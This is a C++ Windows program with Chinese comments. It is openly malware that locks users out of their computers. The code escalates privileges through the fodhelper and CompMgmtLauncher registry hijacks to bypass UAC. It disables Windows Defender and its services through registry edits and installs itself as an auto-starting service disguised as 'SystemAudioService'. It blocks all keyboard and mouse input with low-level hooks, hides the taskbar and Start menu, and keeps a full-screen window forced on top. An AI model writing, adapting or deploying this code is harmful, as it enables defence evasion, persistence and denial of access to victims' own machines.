#include <windows.h>
#include <iostream>
#include <unistd.h>
#include <tchar.h>
#include <thread>
#include <string>

using namespace std;
 
//获取当前exe程序所在路径
char *GetExeFullPath()
{
	TCHAR szPath[MAX_PATH];
	string pathstr;
	GetModuleFileName(NULL,szPath,MAX_PATH);
 	pathstr = szPath;
 	char * pathrtn=(char*)pathstr.data();
	return pathrtn;
}

int Sysver()
{
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
    HINSTANCE hinst = LoadLibrary(TEXT("ntdll.dll"));//加载DLL
    NTPROC GetNtVersionNumbers = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");//获取函数地址
    DWORD dwMajor, dwMinor, dwBuildNumber;
    GetNtVersionNumbers(&dwMajor, &dwMinor, &dwBuildNumber);
    if (dwMajor == 10 && dwMinor == 0){
        return 10;
    }
    if (dwMajor == 6 && dwMinor == 1){
        return 7;
    }
}
bool IsProcessRunAsAdmin()//判断程序是否为管理员身份（是返回1，否则反之） 原帖： https://blog.csdn.net/zcy5157912/article/details/125109747
{
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    BOOL b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup);
    if(b)
    {
        CheckTokenMembership(NULL, AdministratorsGroup, &b);
        FreeSid(AdministratorsGroup);
    }
    return b == TRUE;
}
 
void CloseWD()//字面意思，关Windows Denference(Need AdminAccount)  原帖：https://blog.csdn.net/qq_34185638/article/details/127273044 
{
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
} 
void regsystask()
{
	string regcomm = 
		"sc create SystemAudioService binpath= \"" + string(GetExeFullPath()) +"\" start= auto displayname= \"SystemAudioService\"";
	const char* cwd_char = regcomm.data();
	system(cwd_char);
	system("net start SystemAudioService");
 } 

HHOOK hook_hwnd_keyboard = NULL;
HHOOK hook_hwnd_mouse = NULL;
HMODULE g_module;
 
// 鼠标事件
LRESULT CALLBACK MyHookFunMouse(int nCode, WPARAM wParam, LPARAM lParam)
{
	// 鼠标所有事件都不处理
	return 1;
}
 
// 键盘事件
LRESULT CALLBACK MyHookFunKeyBoard(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT pVirKey = (PKBDLLHOOKSTRUCT)lParam;
 
	if (nCode >= 0)
	{
		// 按键消息
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
		case WM_KEYUP:
		case WM_SYSKEYUP:
			switch (pVirKey->vkCode)
			{
			case VK_LWIN:
			case VK_RWIN:
				return 1;
				break;
			}
			return 1;
			break;
		}
	}
 
	return CallNextHookEx(hook_hwnd_keyboard, nCode, wParam, lParam);
}

void topmost()
{
	while(1)
	{
		int cX = GetSystemMetrics(SM_CXSCREEN);   
		int cY = GetSystemMetrics(SM_CYSCREEN);
		HWND stw = FindWindow("Shell_TrayWnd",NULL); 
		HWND cmd = FindWindow("ConsoleWindowClass",NULL); 
		HWND m = FindWindow("Windows.UI.Core.CoreWindow","启动");//开始菜单 
		SetWindowPos(stw,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		SetWindowPos(cmd,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		SetWindowPos(m,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		HWND top = FindWindow("UnrealClass","Boundary");
		HWND foreground = GetForegroundWindow();
		if(top!=foreground){
			SetWindowPos(top,HWND_TOPMOST,0,0,cX,cY,SWP_SHOWWINDOW|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		}
		SetFocus(top);
		Sleep(10); 
	}
}
/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		/* Upon destruction, tell the main thread to stop */
		case WM_DESTROY: {
			break;
		}
		
		/* All other messages (a lot of them) are processed using default procedures */
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WNDCLASSEX wc; /* A properties struct of our window */
	HWND hwnd; /* A 'HANDLE', hence the H, or a pointer to our window */
	MSG msg; /* A temporary location for all messages */

	bool IsProcessRunAsAdmin();
    void regsystask();
	void CloseWD();
	void topmost();
	int Sysver();

	/* zero out the struct and set the stuff we want to modify */
	memset(&wc,0,sizeof(wc));
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.lpfnWndProc	 = WndProc; /* This is where we will send messages to */
	wc.hInstance	 = hInstance;
	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
	
	/* White, COLOR_WINDOW is just a #define for a system color, try Ctrl+Clicking it */
	wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(71,204,255));
	wc.lpszClassName = "UnrealClass";
	wc.hIcon		 = LoadIcon(NULL, IDI_APPLICATION); /* Load a standard icon */
	wc.hIconSm		 = LoadIcon(NULL, IDI_APPLICATION); /* use the name "A" to use the project icon */

	if(!RegisterClassEx(&wc)) {
		MessageBox(NULL, "Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	if(IsProcessRunAsAdmin()==0){
		if(Sysver()==10){
			string cmdbypass =
				"/c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\" + string("open") + "\\command /v \"DelegateExecute\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\" + string("open") + "\\command /d \"cmd /c start " + string(GetExeFullPath()) +"\" /f && START /W fodhelper.exe && reg delete HKCU\\Software\\Classes\\ms-settings /f"; 
			const char* cbs10_char = cmdbypass.data();
			ShellExecute(NULL, "open", "cmd", cbs10_char, NULL, SW_HIDE);
			PostQuitMessage(0);
		}
		else if(Sysver()==7){
			string cmdbypass =
				"/c reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\" + string("open") + "\\command /d \""+ string(GetExeFullPath()) +"\" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f" ;
			const char* cbs7_char = cmdbypass.data();
			ShellExecute(NULL, "open", "cmd", cbs7_char, NULL, SW_HIDE);
			PostQuitMessage(0);
		}
	}
	if(IsProcessRunAsAdmin()==1){
	regsystask();
	CloseWD(); 
	}
	int cX = GetSystemMetrics(SM_CXSCREEN);   
	int cY = GetSystemMetrics(SM_CYSCREEN);

	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"UnrealClass","Boundary",WS_VISIBLE|WS_POPUP|WS_CLIPSIBLINGS,
		CW_USEDEFAULT, /* x */
		CW_USEDEFAULT, /* y */
		cX, /* width */
		cY, /* height */
		NULL,NULL,hInstance,NULL);

	if(hwnd == NULL) {
		MessageBox(NULL, "Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	SetWindowLong(hwnd,GWL_EXSTYLE,GetWindowLong(hwnd,GWL_EXSTYLE)^0x80000);      
    HINSTANCE  hInst = LoadLibrary("User32.DLL");    
    if(hInst != NULL)  
    {  
        typedef BOOL (WINAPI *MYFUNC)(HWND, COLORREF, BYTE, DWORD);   
          
        MYFUNC pFunc = (MYFUNC)GetProcAddress(hInst, "SetLayeredWindowAttributes");  
        if (pFunc != NULL){
               pFunc(hwnd, 0,15, 2);    
        	}  
        FreeLibrary(hInst);  
        hInst = NULL;  
    }
    hook_hwnd_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, MyHookFunKeyBoard, g_module, 0);
	hook_hwnd_mouse = SetWindowsHookEx(WH_MOUSE_LL, MyHookFunMouse, g_module, 0);
    EnableWindow(hwnd,false);
    thread topmst(topmost);
    topmst.detach();
	/*
		This is the heart of our program where all input is processed and 
		sent to WndProc. Note that GetMessage blocks code flow until it receives something, so
		this loop will not produce unreasonably high CPU usage
	*/
	while(GetMessage(&msg, NULL, 0, 0) > 0) { /* If no error is received... */
		TranslateMessage(&msg); /* Translate key codes to chars if present */
		DispatchMessage(&msg); /* Send it to WndProc */
	}
	return msg.wParam;
}
